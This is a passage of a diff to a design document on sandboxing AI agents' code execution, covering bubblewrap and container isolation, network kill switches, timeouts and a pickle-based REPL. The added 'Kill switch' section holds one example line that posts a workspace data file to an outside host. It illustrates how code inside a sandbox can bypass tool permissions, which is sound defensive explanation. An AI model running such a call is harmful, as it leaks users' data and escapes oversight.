-- Host paths computed from session context (`user_id`, `session_id`)
-- Translation happens at the boundary between application and container layers
-- Volume subpaths enable multi-tenancy on shared storage
-
-### Lifecycle Management with Health Monitoring
-
-Containers follow a managed lifecycle with verification at each stage and continuous health monitoring to detect failures.
-
-**Startup Verification**:
-- Containers must achieve sustained "running" state (multiple consecutive checks)
-- Prevents race conditions where containers briefly appear running before crashing
-- Startup failures captured with diagnostic logs for debugging
-- Fast-fail approach: Reject containers that cannot reach stable state
-
-**Continuous Health Monitoring**:
-- Background thread periodically checks all tracked containers
-- Detects external failures: manual stops, crashes, OOM kills, removals
-- Handler pattern enables reactive responses to failures
-- Polling interval trades detection latency vs. system load
-
-**Automatic Cleanup**:
-- Age-based cleanup removes old containers automatically
-- Prevents resource accumulation from abandoned sessions
-- Force cleanup on startup handles unclean shutdowns
-- Port resources released synchronously with container removal
-
-### Multi-Level Failure Detection
-
-The system implements defense-in-depth for failure detection, combining proactive monitoring with reactive validation.
-
-**Detection Layers**:
-
-1. **Proactive Layer** (Health Monitoring):
-   - Periodic background polling of all containers
-   - Detects failures even when system is idle
-   - Marks affected sessions for automatic recovery
-
-2. **Reactive Layer** (Pre-Use Validation):
-   - Status check before every operation
-   - Catches failures between monitoring intervals
-   - Ensures container validity immediately before use
-
-3. **Recovery Layer** (Automatic Recreation):
-   - Sessions marked ERROR automatically recreated on next use
-   - Transparent to clients (idempotent operations)
-   - Data preserved through persistent storage
-
-**Failure Flow**:
-```
-External Failure
-    ↓
-Health Monitor Detection
-    ↓
-Session Marked ERROR
-    ↓
-Client Next Request
-    ↓
-Pre-Use Validation
-    ↓
-Container Recreated
-    ↓
-Operation Proceeds
-```
-
-This layered approach provides maximum detection latency of one monitoring interval while ensuring operations never proceed on failed containers.
-
-### Concurrency Model
-
-The system uses multi-threaded background processing with careful synchronization to handle concurrent operations safely.
-
-**Thread Categories**:
-- **Lifecycle Threads**: Container cleanup, session expiration
-- **Monitoring Threads**: Health checks, service status monitoring
-- **Execution Threads**: Command execution with timeout enforcement
-
-**Synchronization Strategy**:
-- Fine-grained locks protect shared data structures
-- Copy-before-iterate pattern prevents modification-during-iteration
-- All background threads are daemon threads (clean shutdown)
-- Lock-free reads where possible through immutable snapshots
-
-**Command Execution Isolation**:
-- Each command execution runs in isolated process
-- Timeout enforcement through process termination
-- Inter-process communication via queues (not shared memory)
-- Graceful degradation: SIGTERM → SIGKILL escalation
-
-**Race Condition Prevention**:
-- Sustained state checks (multiple consecutive reads) for critical transitions
-- Activity updates before status checks (establishes happens-before relationships)
-- Atomic state transitions through lock-protected modifications
-- No assumptions about operation ordering across threads
-
-### Service Management Architecture
-
-Long-running processes (web servers, databases) require different lifecycle management than one-off commands. The service subsystem addresses this with background process management and health monitoring.
-
-**Background Execution Pattern**:
-- Services started via `nohup` with output redirection
-- PID captured and tracked for lifecycle operations
-- Process monitoring through PID checks, not container status
-- Exit code captured for post-mortem analysis
-
-**Monitoring Strategy**:
-- Per-session service monitor with dedicated thread
-- Periodic process existence checks via PID
-- Port detection through `lsof` (dynamic port discovery)
-- Status updates don't affect session activity (read-only monitoring)
-
-**Service State Machine**:
-```
-STARTING → RUNNING → STOPPED (graceful)
-                   → FAILED (error exit)
-                   → STOPPING → STOPPED (manual stop)
-```
-
-**Lifecycle Operations**:
-- **Start**: Generate script, execute with nohup, capture PID
-- **Monitor**: Check PID, update ports, detect failures
-- **Stop**: Graceful SIGTERM, wait, force SIGKILL if needed, fallback to pattern kill
-- **Logs**: Tail stdout/stderr files, queryable by clients
-
-**Design Rationale**:
-- Services don't allocate specific ports (container has pre-allocated pool)
-- System detects actual ports post-startup (flexible port binding)
-- Services cleared on container failure (stale state eliminated)
-- No automatic restart (client controls service lifecycle)
-
-### Resource Management
-
-**Port Allocation**:
-- Fixed pool of ports allocated per container at creation
-- Singleton port manager prevents double-allocation
-- Ports released when container removed (no leaks)
-- Services bind to any available port within allocation
-
-**Resource Limits**:
-- CPU quotas prevent CPU exhaustion
-- Memory limits prevent OOM on host
-- Configurable per-container via ContainerConfig
-- Limits enforced by container runtime
-
-**Port Management Pattern**:
-- Pre-allocation at container creation (not on-demand)
-- Fixed pool per container (predictable resource usage)
-- Container-scoped allocation (cleanup happens naturally)
-- Detection over configuration (discover actual ports post-startup)
-
-### Security Architecture
-
-**Defense-in-Depth Layers**:
-
-1. **Container Isolation**:
-   - Separate Linux namespaces per session
-   - Non-root execution (runs as dedicated user)
-   - Resource limits prevent DoS
-   - Filesystem isolation through mount namespaces
-
-2. **Network Security**:
-   - Configurable port binding (localhost vs. all interfaces)
-   - Optional proxy mode for restricted environments
-   - Port exhaustion prevention through fixed pools
-   - Service port range isolation
-
-3. **Execution Security**:
-   - Timeout enforcement prevents infinite loops
-   - Working directory restrictions
-   - Command execution through controlled interfaces
-   - Script generation with safe path handling
-
-4. **Access Control**:
-   - Session-based isolation (no cross-session access)
-   - Path translation prevents directory traversal
-   - Workspace-scoped file operations
-   - Session authentication at API boundary
-
-**Proxy Mode Design**:
-- Containers inherit parent's network configuration
-- Enables corporate proxy compliance
-- Maintains network isolation in restricted environments
-- Optional feature activated via configuration
-
-### Observability Design
-
-Comprehensive structured logging enables debugging, auditing, and operational monitoring.
-
-**Log Categories**:
-- **System Logs**: Infrastructure events (container lifecycle, health monitoring)
-- **Command Logs**: Execution events with timing and results
-- **Code Logs**: Programming language execution with full context
-- **Service Logs**: Long-running process lifecycle and health
-
-**Log Enrichment Strategy**:
-- Context propagation: All logs include user_id, session_id, container_id
-- Timing information: Duration tracking for performance analysis
-- Error context: Stack traces, diagnostic output, pre-failure state
-- Correlation IDs: Trace requests across component boundaries
-
-**Structured Logging Benefits**:
-- Machine-readable format (JSON) enables automated analysis
-- Queryable by multiple dimensions (user, session, event type)
-- Consistent schema across all log types
-- Extensible through metadata fields
-
-**Operational Visibility**:
-- Container failures logged with diagnostic information
-- Service failures include stdout/stderr snapshots
-- Background thread errors logged without crashing threads
-- Health monitoring events tracked for trend analysis
-
-## Key Design Patterns
-
-### Lazy Initialization with Auto-Creation
-
-Resources created on first use rather than eagerly. Sessions and containers created when first accessed, not when user connects.
-
-**Benefits**:
-- Reduces resource consumption (only create what's needed)
-- Faster apparent response (no upfront cost)
-- Natural load distribution (creation spreads over time)
-
-**Implementation**: `ensure_container_available()` checks existence and creates if needed transparently to caller.
-
-### Handler Registration for Event Notification
-
-Components register callbacks with lifecycle managers to receive notifications about events (container failures, service crashes).
-
-**Benefits**:
-- Loose coupling between components
-- Easy to extend with new handlers
-- Event processing isolated from detection
-
-**Pattern**:
 ```python
-container_manager.register_external_failure_handler(
-    session_manager.handle_external_container_failure
-)
+class SandboxBubblewrap(Sandbox):
+    def _build_command(self, command, bind_mounts, isolate_network, isolate_pid, cwd):
+        cmd = [
+            "bwrap",
+            "--ro-bind", "/usr", "/usr",
+            "--ro-bind", "/lib", "/lib",
+            "--ro-bind", "/bin", "/bin",
+            "--proc", "/proc",
+            "--dev", "/dev",
+            "--tmpfs", "/tmp",
+        ]
+        # User-specified mounts
+        for mount in bind_mounts:
+            flag = "--ro-bind" if mount.readonly else "--bind"
+            cmd.extend([flag, str(mount.source), mount.target])
+        # Optional namespace isolation
+        if isolate_pid:
+            cmd.append("--unshare-pid")
+        if isolate_network:
+            cmd.append("--unshare-net")
+        ...
 ```
 
-### Copy-Before-Iterate for Thread Safety
+The child process sees a read-only root filesystem, a private `/tmp`, and only the bind mounts explicitly granted. PID and network namespaces can be unshared independently. This is lightweight (no daemon, no images, no layers) and fast to start.
 
-Shared collections copied before iteration to avoid modification-during-iteration errors without holding locks during processing.
+### Fallback: Plain Subprocess
 
-**Pattern**:
+On platforms without bwrap (macOS, Windows), a subprocess fallback runs the command directly. No isolation is provided -- this is a development convenience, not a security boundary. The factory function selects the appropriate implementation:
+
 ```python
-with self.lock:
-    items_copy = list(self.items.values())
-# Process without lock
-for item in items_copy:
-    process(item)
+def get_sandbox() -> Sandbox:
+    if shutil.which("bwrap"):
+        return SandboxBubblewrap()
+    return SandboxSubprocess()
 ```
 
-**Trade-offs**: Memory cost of copy vs. reduced lock contention.
+### Heavyweight Isolation: Containers
 
-### Singleton Pattern for Global Resources
+For production multi-tenant deployments, container runtimes (Docker, Podman) provide stronger isolation: separate filesystem layers, cgroup resource limits, full network namespace control, and seccomp profiles. Container-based sandboxes are heavier to start and manage, but offer guarantees that bwrap alone does not (CPU/memory limits, storage quotas, image-based reproducibility).
 
-Shared resources like PortManager use singleton pattern to ensure single source of truth.
+The sandbox abstraction accommodates both: the `Sandbox` ABC defines a uniform `run()` interface, and implementations range from "no isolation" through "user namespaces" to "full containers". The choice depends on the deployment context.
 
-**Rationale**: Port allocation must be globally coordinated to prevent conflicts.
+## Filesystem Isolation
 
-**Implementation**: Module-level instance with accessor function.
+The agent's code needs to read and write files, but it should only access its own workspace -- not the host filesystem, not other users' data.
 
-### Base Class Pattern for Common Functionality
+### Bind Mounts
 
-`BaseOperator` provides common functionality (session management, container checks, logging) to all operator types (shell, code, service).
+The sandbox exposes specific host directories to the child process through bind mounts. A `BindMount(source, target, readonly)` maps a host path to a path visible inside the sandbox:
 
-**Benefits**:
-- Code reuse across operator types
-- Consistent patterns for container access
-- Centralized session activity tracking
-- Uniform error handling
-
-### Monitoring Pattern with Read-Only Operations
-
-Service monitoring reads status without updating session activity, preventing monitors from keeping sessions alive indefinitely.
-
-**Key Distinction**:
-- User operations: Update session activity (keep alive)
-- Monitoring operations: Read-only (don't affect lifetime)
-
-**Implementation**: Separate code paths with `update_activity` flag.
-
-## Key Learnings and Best Practices
-
-### Sustained State Verification
-
-Don't trust single status checks for critical state transitions. Container appearing "running" once doesn't guarantee stability.
-
-**Solution**: Require multiple consecutive checks before considering state stable. Prevents race conditions where containers briefly appear running before crashing.
-
-### Separation of Detection and Recovery
-
-Failure detection and recovery should be separate concerns handled at different layers.
-
-- Health monitoring detects failures and updates state
-- Request handling triggers recovery when needed
-- Separation enables testing each independently
-
-### Activity-Based Lifecycle Management
-
-Resources (sessions, containers) lifetime controlled by inactivity timeout rather than absolute TTL.
-
-**Benefits**:
-- Active sessions never expire unexpectedly
-- Inactive resources reclaimed automatically
-- Activity tracking simple (update timestamp on use)
-
-### Workspace Persistence Pattern
-
-Separating workspace storage from container lifecycle enables transparent container recreation.
-
-- Data outlives containers
-- Failures recoverable without data loss
-- Container becomes disposable execution environment
-
-### Monitoring Without Side Effects
-
-Background monitoring must not affect system state (beyond updates to monitoring data).
-
-**Principle**: Monitoring checks status but doesn't trigger activity updates, session creation, or container recreation.
-
-**Rationale**: Prevents monitoring from keeping resources alive indefinitely.
-
-### Graceful Degradation in Cleanup
-
-Cleanup operations should never crash the cleanup process. Log errors but continue processing remaining items.
-
-**Pattern**:
 ```python
-for item in items:
-    try:
-        cleanup(item)
-    except Exception as e:
-        log_error(e)  # Don't crash cleanup thread
-        continue
+bind_mounts = [
+    BindMount(workspace_path, "/workspace"),           # read-write
+    BindMount(temp_dir, str(temp_dir)),                # IPC channel
+]
 ```
 
-### Timeout Enforcement Through Process Isolation
+Inside the sandbox, the code sees `/workspace` as its working directory. It has no way to access paths outside the mounted directories.
 
-Reliable timeout enforcement requires process isolation. Cannot reliably interrupt thread executing user code.
+### Multi-Tenant Directory Layout
 
-**Solution**: Execute commands in separate process, terminate process on timeout.
+When multiple users and sessions share a host, each session gets its own workspace directory:
 
-### Pre-allocated Resource Pools
+```
+{data_dir}/
+  {user_id}/
+    {session_id}/
+      [session files]
+```
 
-Pre-allocate resources (ports) at container creation rather than on-demand.
+The sandbox mounts only the current session's directory. Physical separation at the filesystem level prevents cross-session access without relying on application-level checks.
 
-**Benefits**:
-- Predictable resource usage
-- Simpler allocation logic
-- Natural cleanup (resources released with container)
-- Prevents resource exhaustion from gradual leaks
+### Path Translation
 
-### State Machine Clarity
+A translation layer converts between the agent-visible path (`/workspace/report.csv`) and the host path (`/data/users/alice/session-42/report.csv`). This happens at the boundary between the application and the sandbox -- the agent's code never sees host paths, and the host system never trusts agent-provided paths without translation and traversal checks.
 
-Explicit state machines with well-defined transitions make system behavior predictable.
+## Network Isolation
 
-**Examples**:
-- Container status: CREATING → RUNNING → STOPPED/ERROR
-- Service status: STARTING → RUNNING → STOPPED/FAILED
-- Session status tracks container status
+Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework.
 
-Clear states enable:
-- Predictable error handling
-- Simplified recovery logic
-- Better observability
+### Binary Network Control
 
-## Scalability Considerations
+The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same.
 
-**Current Design Limits**:
-- One container per session (1:1 ratio)
-- Background threads poll all tracked resources
-- Port pool size limits concurrent containers
+There is no allow-list, no proxy, no partial access. This eliminates configuration errors and makes the security property trivial to verify.
 
-**Scaling Strategies**:
-- Horizontal: Multiple MCP server instances with load balancing
-- Vertical: Increase container resource limits
-- Port pools: Separate ranges per server instance
-- Monitoring: Migrate to event-based model for large container counts
+### Integration with Data Sensitivity
 
-**Trade-offs Accepted**:
-- Polling overhead acceptable for hundreds of containers
-- One container per session provides strongest isolation
-- Port pre-allocation wastes some resources for predictability
+The network isolation decision can be driven by data classification. When a session processes sensitive data (flagged by connectors via a compliance layer like `PrivateData`), the sandbox automatically disables network access:
+
+```python
+isolate_network = session_has_private_data(user_id, session_id)
+```
+
+This is a one-way ratchet: once sensitive data enters a session, the network stays off for the session's lifetime. Sensitivity escalates but never degrades.
+
+### Workspace Survival Across Recreation
+
+If a running sandbox must be recreated to change its network mode (for example, when private data arrives mid-session), the workspace survives because it lives on the host filesystem. The old sandbox is destroyed, a new one is created with network disabled, and the same workspace directory is mounted again. From the agent's perspective, all files are still present -- only the network has changed.
+
+## Timeout Enforcement
+
+Agent-generated code can loop forever, deadlock, or simply take longer than acceptable. Reliable timeout enforcement requires process-level control -- you cannot reliably interrupt a thread executing arbitrary code.
+
+The sandbox starts the child process, then uses `asyncio.wait_for` with a timeout. If the timeout expires, the process is killed:
+
+```python
+try:
+    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
+    return SandboxResult(exit_code=process.returncode, stdout=stdout, stderr=stderr)
+except asyncio.TimeoutError:
+    process.kill()
+    await process.wait()
+    return SandboxResult(exit_code=-1, timed_out=True)
+```
+
+The calling code receives a `SandboxResult` with `timed_out=True` and can report the timeout to the agent without crashing the host process.
+
+## Inter-Process Communication
+
+The sandbox runs code in a separate process. The calling code needs to send input (source code, namespace state) and receive output (results, stdout, stderr, figures). Two common patterns:
+
+### Pickle IPC
+
+The REPL module uses pickle-based IPC through the filesystem. The caller writes a pickle file to a temp directory, the sandbox mounts that directory, the executor reads input and writes output as pickle files:
+
+```python
+# Caller side
+(temp_dir / "input.pkl").write_bytes(pickle.dumps(input_data))
+result = await sandbox.run(command, bind_mounts=[BindMount(temp_dir, str(temp_dir))], ...)
+output = pickle.loads((temp_dir / "output.pkl").read_bytes())
+```
+
+This works because the temp directory is bind-mounted into the sandbox, giving both sides access. The approach is simple and supports arbitrary Python objects (dataframes, figures, custom classes).
+
+### Stdout/Stderr Capture
+
+For simpler cases, the sandbox captures the child process's stdout and stderr as byte strings in `SandboxResult`. This suffices for commands that produce text output and where the only structured result is the exit code.
+
+## Resource Limits
+
+Beyond filesystem and network isolation, production sandboxes need resource limits to prevent a single session from exhausting host resources.
+
+**CPU and memory**: Container runtimes enforce these through cgroups. Bwrap does not manage cgroups, so resource limits require either a container runtime or external cgroup management.
+
+**Execution time**: Handled by the timeout mechanism described above.
+
+**Storage**: Workspace directories can be placed on quota-managed filesystems or volume-limited container mounts.
+
+**Process count**: PID namespace isolation (`--unshare-pid` in bwrap, default in containers) prevents fork bombs from affecting the host.
+
+## Session Lifecycle
+
+In a multi-tenant system, sandboxes are tied to user sessions. The lifecycle follows a predictable pattern:
+
+**Lazy creation**: The sandbox is not created when the user connects. It is created on first code execution, avoiding resource allocation for sessions that never run code.
+
+**Activity tracking**: Each code execution updates a timestamp. Sessions that remain idle beyond a configurable timeout are eligible for cleanup.
+
+**Failure recovery**: If a sandbox process crashes or is killed externally, the next execution attempt detects the failure and creates a new sandbox. The workspace persists through failures because it lives on the host filesystem, making the sandbox a disposable execution environment.
+
+**Cleanup**: Background processes periodically remove expired sessions and their sandbox resources. Cleanup operations are defensive -- errors in cleaning one session do not prevent cleanup of others.
+
+## Security Layers
+
+The sandbox is one layer in a defense-in-depth approach to agent security:
+
+1. **Tool permissions** (`@tool_permission` with READ/WRITE/CONNECT) constrain what the agent can do through its normal tool-calling interface.
+2. **Sandbox isolation** constrains what the agent's generated code can do at the infrastructure level -- filesystem, network, process, and resource boundaries.
+3. **Data compliance** drives sandbox configuration automatically, tightening isolation when sensitive data enters a session.
+
+These layers are independent. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together, they cover both vectors without relying on the agent's cooperation.
+
+## Design Trade-offs
+
+**One sandbox per session** simplifies lifecycle management (no shared state, no cross-session interference) but costs more resources than pooling. For strong isolation, this trade-off is worthwhile.
+
+**Binary network control** (full access or none) is less flexible than allow-lists or proxies, but eliminates configuration errors and is easy to audit.
+
+**Pickle IPC** supports rich Python objects but introduces deserialization risks. The temp directory is short-lived and mounted read-write only for the duration of execution, limiting the attack surface.
+
+**Subprocess fallback** provides no isolation on non-Linux platforms. This is acceptable for development but must not be used in production with untrusted code.
 
 
 ## REPL
@@ -11162,9 +10344,9 @@ The REPL pattern enables an agent to iteratively execute code in a shared, state
 
 ### Historical perspective
 
-The REPL (Read–Eval–Print Loop) is one of the oldest interaction models in computing. It emerged in the 1960s with interactive Lisp systems, where programmers could incrementally define functions, evaluate expressions, and inspect results without recompiling entire programs. This interactive style strongly influenced later environments such as Smalltalk workspaces and, decades later, Python and MATLAB shells.
+The REPL (Read-Eval-Print Loop) is one of the oldest interaction models in computing. It emerged in the 1960s with interactive Lisp systems, where programmers could incrementally define functions, evaluate expressions, and inspect results without recompiling entire programs. This interactive style strongly influenced later environments such as Smalltalk workspaces and, decades later, Python and MATLAB shells.
 
-In the context of AI systems, early program synthesis and symbolic reasoning tools already relied on REPL-like loops to test hypotheses and refine partial solutions. More recently, the rise of notebook environments and agentic systems has renewed interest in REPL semantics as a way to let models explore, test, and refine code through execution. The key research shift has been from “single-shot” code generation to **execution-aware reasoning**, where intermediate results guide subsequent steps.
+In the context of AI systems, early program synthesis and symbolic reasoning tools already relied on REPL-like loops to test hypotheses and refine partial solutions. More recently, the rise of notebook environments and agentic systems has renewed interest in REPL semantics as a way to let models explore, test, and refine code through execution. The key research shift has been from "single-shot" code generation to **execution-aware reasoning**, where intermediate results guide subsequent steps.
 
 ### The REPL pattern in agentic systems
 
@@ -11185,51 +10367,73 @@ First, **state continuity**. Each execution step must see the effects of previou
 
 Second, **isolation and safety**. Arbitrary code execution is dangerous in long-running systems. Modern REPL designs therefore decouple *logical continuity* from *physical isolation*: each execution runs in a constrained environment, yet the system reconstructs enough context to make the experience appear continuous.
 
+### The notebook and cell model
+
+A natural way to organize a REPL for agents is to borrow the notebook metaphor from Jupyter. A **notebook** represents a session: it owns a shared namespace, tracks execution history, and persists its state to disk. Each unit of code submitted for execution is a **cell**.
+
+A cell progresses through a lifecycle: IDLE when created, RUNNING during execution, and then either COMPLETED, ERROR, or TIMEOUT. Each cell records its outputs, execution time, and position in the notebook. A global execution counter tracks how many cells have been run, providing an ordering that both the agent and the user can reference.
+
+This model gives the REPL a clear structure. The notebook manages the shared namespace, the accumulated import and function declarations, and the persistence lifecycle. Cells are self-contained execution units that can be inspected, re-run, or deleted independently.
+
 ### Process isolation with a persistent-state illusion
 
-A robust REPL for agents typically executes each step in a fresh process. This avoids crashes, memory leaks, and infinite loops from destabilizing the host system. To preserve continuity, the environment state is serialized before execution and merged back afterward.
+A robust REPL for agents executes each cell in a fresh subprocess. This avoids crashes, memory leaks, and infinite loops from destabilizing the host system. To preserve continuity, the namespace is serialized before execution and restored afterward.
+
+The serialization mechanism uses pickle-based IPC through the filesystem. Before execution, the host pickles the current namespace, accumulated imports, and function definitions into an input file inside a temporary directory. The subprocess reads this input, executes the cell code, and writes the resulting namespace and outputs back to an output file in the same directory. The host then reads the output and merges the updated namespace.
 
 Conceptually:
 
 ```
-# Before execution
-snapshot = serialize(namespace_without_modules)
+# Before execution -- host side
+pickle_write(temp_dir / "input.pkl", {
+    code, namespace, import_statements, function_definitions
+})
 
-# In isolated process
-namespace = deserialize(snapshot)
-replay(imports)
-replay(function_definitions)
-exec(code, namespace)
-delta = extract_updated_variables(namespace)
+# In isolated subprocess
+data = pickle_read(temp_dir / "input.pkl")
+namespace = data["namespace"]
+replay(data["import_statements"])
+replay(data["function_definitions"])
+exec(data["code"], namespace)
+filtered = filter_picklable(namespace)
+pickle_write(temp_dir / "output.pkl", {state, outputs, filtered})
 
-# After execution
-namespace.update(delta)
+# After execution -- host side
+result = pickle_read(temp_dir / "output.pkl")
+namespace.update(result.namespace)
 ```
 
-The important constraint is that only serializable objects can persist. Modules and other non-serializable artifacts are handled indirectly, usually by tracking their source representation rather than their in-memory form.
+The important constraint is that only picklable objects can persist. Modules, open file handles, database connections, generators, and threading primitives cannot survive the process boundary. Rather than silently dropping these, a well-designed REPL provides actionable feedback: "reopen file in next cell", "use `def` instead of lambda", "reconnect in next cell". This helps the agent (or user) understand what state was lost and how to recover it.
+
+Some objects require special handling. For example, openpyxl workbooks are not directly picklable, but they can be saved to temporary files and restored via a lightweight reference object. The reference carries the path to the temp file; when the next cell executes, the workbook is reloaded from disk. This pattern generalizes to any complex object that supports save/load semantics but not pickle.
+
+### Sandboxing
+
+Process isolation alone does not provide meaningful security. The subprocess inherits the host's filesystem access, network, and process namespace. A production REPL needs a sandbox layer that restricts what the subprocess can do.
+
+Our implementation uses a generic sandbox abstraction with two backends. On Linux, it uses bubblewrap (`bwrap`), a lightweight container tool that provides filesystem, network, and PID namespace isolation. The sandbox mounts system directories (`/usr`, `/lib`, `/bin`) as read-only, exposes the Python installation for package access, and bind-mounts only the specific directories the cell needs: the workspace (for user data) and the temporary directory (for pickle IPC). Network access and PID isolation can be toggled independently.
+
+On macOS and in development environments where bubblewrap is not available, the sandbox falls back to a plain subprocess with no isolation. A factory function selects the appropriate backend at runtime.
+
+One useful refinement is **data-driven network isolation**. If a session has been flagged as containing private data (for example, after loading sensitive files), the sandbox enables network isolation automatically. This prevents exfiltration of sensitive data through code execution, even if the agent or user does not explicitly request it.
 
 ### Import and function tracking
 
 One subtle challenge in isolated REPL execution is that imports and function definitions do not survive process boundaries. A common solution is to treat them as *replayable declarations*.
 
-Each execution step is analyzed to extract:
+After each cell executes, the notebook parses the cell's code using AST analysis to extract two kinds of declarations: import statements (both `import x` and `from x import y` forms) and function definitions. These are stored as source strings on the notebook, deduplicated to avoid redundant re-execution.
 
-* Import statements, stored as source strings.
-* Function definitions, stored as their full source.
-
-Before running the next step, all prior imports and function definitions are re-executed in order. This works because imports are idempotent and function redefinition is generally safe.
-
-A simplified illustration:
+Before running the next cell, all accumulated imports and function definitions are re-executed in the subprocess's namespace before the cell code runs. This works because imports are idempotent and function redefinition is generally safe.
 
 ```
-# On parsing a cell
-imports += extract_imports(code)
-functions += extract_functions(code)
+# After cell execution -- notebook side
+import_statements += extract_imports(cell.code)   # AST-based
+function_definitions += extract_functions(cell.code)  # AST-based
 
-# On next execution
-for stmt in imports:
+# Before next cell execution -- subprocess side
+for stmt in import_statements:
     exec(stmt, namespace)
-for fn in functions:
+for fn in function_definitions:
     exec(fn, namespace)
 exec(current_code, namespace)
 ```
@@ -11240,242 +10444,347 @@ This approach preserves developer- and agent-defined APIs across executions with
 
 For agents, execution output is not only for human inspection; it is input to the next reasoning step. A REPL therefore treats outputs as structured data rather than raw text.
 
-Typical output categories include:
+Each cell produces a list of typed outputs. The output types in our implementation are TEXT, ERROR, HTML, IMAGE, and DATAFRAME. Standard output becomes TEXT, exceptions become ERROR with tracebacks, and matplotlib figures are captured as IMAGE by configuring a non-interactive backend (Agg) and intercepting `plt.show()`.
 
-* Standard output and error streams.
-* The value of the last expression.
-* Exceptions and tracebacks.
-* Structured artifacts such as tables, HTML, or images.
+A particularly important output is the **last-expression value**. Following the Jupyter convention, if the last statement in a cell is an expression (not an assignment or a control structure), its value is captured and included in the output. This is implemented by parsing the cell code as an AST: if the final node is an `Expr`, it is separated from the rest, the preceding code is `exec`'d, and the final expression is `eval`'d to obtain its value.
 
-Separating *output storage* from *output references* is a useful best practice. Binary data (for example, images) can be stored internally and exposed via lightweight references, allowing the agent or client to fetch them on demand without bloating every response.
+Separating *output storage* from *output references* is also important. Binary data such as images can be stored internally as raw bytes and exposed to the agent or client via lightweight references (a URI like `notebook://cell/0/image/0`). This prevents large binary payloads from bloating every response.
 
 ### Asynchronous execution and concurrency
 
-In agent platforms, REPL execution often happens inside servers that must remain responsive. Blocking execution directly in the event loop does not scale. A common pattern is to expose an asynchronous API while offloading the actual execution to worker threads or subprocesses.
-
-Conceptually:
+In agent platforms, REPL execution often happens inside servers that must remain responsive. Blocking execution directly in the event loop does not scale. The cell's `execute` method is async, but the actual subprocess call is synchronous. The bridge between the two is `asyncio.to_thread()`, which offloads the blocking sandbox call to a worker thread while keeping the event loop free.
 
 ```
-async def execute_step(code):
-    result = await run_in_worker(process_execute, code)
-    return result
+async def execute(self, namespace, timeout, ...):
+    self.state = CellState.RUNNING
+    result = await asyncio.to_thread(self._execute_sync, ...)
+    self.state = result.state
 ```
 
-This separation allows multiple agents or sessions to execute code concurrently while preserving responsiveness.
+This separation allows multiple agents or sessions to execute cells concurrently while preserving responsiveness.
 
 ### Sessions, persistence, and multi-user concerns
 
-Unlike a local shell, an agent REPL usually operates in a multi-user environment. Each session must be isolated, identifiable, and recoverable. Persisting execution history and state to disk after each operation ensures that work is not lost and that sessions can be resumed after failures.
+Unlike a local shell, an agent REPL usually operates in a multi-user environment. Each notebook is scoped to a `(user_id, session_id)` pair and persisted to a well-known path on disk (`WORKSPACE_DIR / user_id / session_id / mcp_repl / cells.json`). The notebook saves its state -- all cells with their code, outputs, and metadata -- after every operation (add, execute, delete, clear). This ensures that work is not lost and that sessions can be resumed after failures.
 
-Persistence also enables secondary capabilities, such as exporting the session into a notebook format or replaying execution steps for audit and debugging.
+Persistence also enables secondary capabilities. The notebook can be exported to Jupyter's `.ipynb` format, making it possible to continue work in a standard notebook interface or share results with collaborators who do not use the agent platform.
 
 ### Best practices distilled
 
 Several best practices consistently emerge when implementing REPLs for agents:
 
 * Prefer process-level isolation over threads for safety and control.
+* Add a sandbox layer (bubblewrap, containers, or similar) beyond simple subprocess isolation.
+* Use pickle-based IPC through the filesystem for subprocess communication.
 * Serialize only data, not execution artifacts; replay imports and functions explicitly.
-* Treat outputs as structured, inspectable objects.
-* Make execution asynchronous at the API level.
+* Provide actionable feedback when objects cannot persist across cells.
+* Treat outputs as structured, typed objects with separate storage for binary data.
+* Capture the last expression's value to match the interactive notebook convention.
+* Make execution asynchronous at the API level via thread offloading.
 * Persist state frequently to support recovery and reproducibility.
 * Impose explicit limits on execution time and resource usage.
+* Consider data-driven security policies such as automatic network isolation for sensitive sessions.
 
 Together, these patterns allow agents to reason *through execution* without compromising system stability.
 
 ### References
 
-1. McCarthy, J. *LISP 1.5 Programmer’s Manual*. MIT Press, 1962.
+1. McCarthy, J. *LISP 1.5 Programmer's Manual*. MIT Press, 1962.
 2. Abelson, H., Sussman, G. J., Sussman, J. *Structure and Interpretation of Computer Programs*. MIT Press, 1996.
-3. Kluyver, T. et al. *Jupyter Notebooks – a publishing format for reproducible computational workflows*. IOS Press, 2016.
+3. Kluyver, T. et al. *Jupyter Notebooks -- a publishing format for reproducible computational workflows*. IOS Press, 2016.
 4. Chen, M. et al. *Evaluating Large Language Models Trained on Code*. arXiv, 2021.
 
 
-## Autonomous vs supervised execution, approval, rollback, and reversibility
+## Kill switch
 
-An execution-mode pattern for tool- and code-running agents that balances autonomy with explicit control points (approvals) and safety nets (rollback / compensations) around state-changing actions.
+When an agent executes arbitrary code inside a sandbox, the tool permission system cannot enforce boundaries. The `@tool_permission` decorator with `CONNECT` checks whether the agent is *allowed* to call a tool, but it has no authority over what happens inside a Docker container where the agent runs Python, shell commands, or any other language. A one-liner `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path. The sandbox section describes how `network_mode="none"` addresses this by removing the container's network stack entirely when private data enters the session. This section steps back and examines the broader design: how to build a network kill switch that can operate at different levels of granularity, and how to make it dynamic enough to activate mid-conversation without disrupting the agent's work.
 
-### Historical perspective
+### The binary switch
 
-The intellectual roots of “supervised autonomy” predate LLM agents by decades. In mixed-initiative user interfaces, researchers studied how systems should fluidly shift control between human and machine, often guided by uncertainty and the cost of mistakes (e.g., when to ask, when to act, when to defer). ([erichorvitz.com][1]) In parallel, databases and distributed systems developed a rigorous vocabulary for **commit**, **logging**, **recovery**, and **undo**, because real systems fail mid-execution and must restore consistent state. ([ACM Digital Library][49])
+The simplest form of the kill switch is a binary choice: full network access or no network access at all. Docker's `network_mode="none"` implements this by stripping every network interface from the container except loopback. No DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.
 
